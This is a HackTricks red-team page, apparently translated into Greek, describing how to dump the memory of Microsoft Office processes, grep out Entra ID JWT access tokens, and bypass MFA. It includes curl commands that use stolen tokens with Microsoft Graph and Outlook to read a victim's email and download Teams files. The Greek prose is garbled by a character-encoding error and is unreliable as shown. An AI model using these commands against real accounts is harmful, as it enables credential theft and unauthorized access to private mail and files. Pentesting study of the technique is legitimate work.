# Az - Processes Memory Access Token

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Basic Information**

ÎŒÏ€Ï‰Ï‚ ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ [**Î±Ï…Ï„ÏŒ Ï„Î¿ Î²Î¯Î½Ï„ÎµÎ¿**](https://www.youtube.com/watch?v=OHKZkXC4Duw), Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¬ Ï„Î·Ï‚ Microsoft Ï€Î¿Ï… ÏƒÏ…Î³Ï‡ÏÎ¿Î½Î¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ Ï„Î¿ cloud (Excel, Teams...) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Ï…Î½ access tokens ÏƒÎµ ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿ ÏƒÏ„Î· Î¼Î½Î®Î¼Î·**. ÎˆÏ„ÏƒÎ¹, Î±Ï€Î»Î¬ **dumping** Ï„Î· **Î¼Î½Î®Î¼Î·** Ï„Î·Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ ÎºÎ±Î¹ **grepping Î³Î¹Î± JWT tokens** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±Ï‚ Î´ÏÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±ÏÎºÎµÏ„Î¿ÏÏ‚ Ï€ÏŒÏÎ¿Ï…Ï‚ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚ ÏƒÏ„Î¿ cloud Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î¿ MFA.

Î’Î®Î¼Î±Ï„Î±:

1. Dump Ï„Î¹Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ excel Ï€Î¿Ï… ÏƒÏ…Î³Ï‡ÏÎ¿Î½Î¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· EntraID Î¼Îµ Ï„Î¿ Î±Î³Î±Ï€Î·Î¼Î­Î½Î¿ ÏƒÎ±Ï‚ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿.
2. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ: `string excel.dmp | grep 'eyJ0'` ÎºÎ±Î¹ Î²ÏÎµÎ¯Ï„Îµ Î±ÏÎºÎµÏ„Î¬ tokens ÏƒÏ„Î·Î½ Î­Î¾Î¿Î´Î¿
3. Î’ÏÎµÎ¯Ï„Îµ Ï„Î± tokens Ï€Î¿Ï… ÏƒÎ±Ï‚ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…Î½ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ¿ ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï€Î¬Î½Ï‰ Ï„Î¿Ï…Ï‚:

{% code overflow="wrap" %}
```bash
# Check the identity of the token
curl -s -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/me | jq

# Check the email (you need a token authorized in login.microsoftonline.com)
curl -s -H "Authorization: Bearer <token>" https://outlook.office.com/api/v2.0/me/messages | jq

# Download a file from Teams
## You need a token that can access graph.microsoft.com
## Then, find the <site_id> inside the memory and call
curl -s -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/sites/<site_id>/drives | jq

## Then, list one drive
curl -s -H "Authorization: Bearer <token>" 'https://graph.microsoft.com/v1.0/sites/<site_id>/drives/<drive_id>' | jq

## Finally, download a file from that drive:
â”Œâ”€â”€(magichkã‰¿black-pearl)-[~]
â””â”€$ curl -o <filename_output> -L -H "Authorization: Bearer <token>" '<@microsoft.graph.downloadUrl>'
```
{% endcode %}

**Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… ÎµÎ¯Î´Î¿Ï…Ï‚ Ï„Î± access tokens Î¼Ï€Î¿ÏÎ¿ÏÎ½ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ Î¼Î­ÏƒÎ± ÏƒÎµ Î¬Î»Î»ÎµÏ‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚.**

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
